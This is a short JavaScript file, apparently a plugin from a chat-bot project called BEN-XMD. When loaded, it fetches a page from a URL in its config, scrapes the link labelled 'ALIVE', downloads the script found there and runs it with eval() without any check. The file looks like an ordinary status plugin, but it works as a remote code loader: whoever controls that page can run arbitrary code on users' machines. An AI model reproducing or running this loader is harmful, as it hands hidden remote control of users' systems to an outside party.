
//  [BEN-XMD TIMES]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Written by Ben                                    
//  >> Version: 4.1.3 ben

const axios = require('axios');
const cheerio = require('cheerio');
const jargon = require(__dirname + "/../config");

async function fetchALIVEUrl() {
  try {
    const response = await axios.get(jargon.BEN_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("ALIVE")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('ALIVE not found 😢 ');
    }

    console.log('ALIVE loaded successfully 🥳');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchALIVEUrl();